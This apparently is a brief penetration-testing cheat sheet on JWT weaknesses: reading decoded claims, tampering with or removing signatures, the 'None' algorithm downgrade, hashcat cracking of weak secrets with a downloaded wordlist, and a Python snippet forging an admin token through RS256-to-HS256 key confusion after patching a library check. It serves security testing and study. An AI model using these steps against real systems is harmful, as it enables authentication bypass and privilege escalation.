- Sensitive Info Disclosure within JWT (decode at `jwt.io`)

- Ignoring Signature -> try to alter or delete the third part after the `.` if it still works, change values and it still accepts them

- None Downgrade -> After decoding at `jwt.io`, try to downgrade the `alg` part:

```bash
{
  "typ": "JWT",
  "alg": "RS256"
}
```

- to `None` in cyberchef! allows you to alter it.

- Weak secrets used -> bruteforcable:

```bash
curl https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list -o jwt.list
#--
hashcat -m 16500 -a 0 jwt.txt jwt.list
```

- Signature alg confusion -> if a public key is embedded within a jwt you can downgrade to an HS256 algorithm using this python code:

```python
import jwt 

public_key = "ADD_KEY_HERE" 
payload = { 'username' : 'admin', 'admin' : 1 } 

access_token = jwt.encode(payload, public_key, algorithm="HS256") 
print (access_token)
```

- you need to comment out the part in `python3.13/site-packages/jwt/algorithms.py` which throws the error!
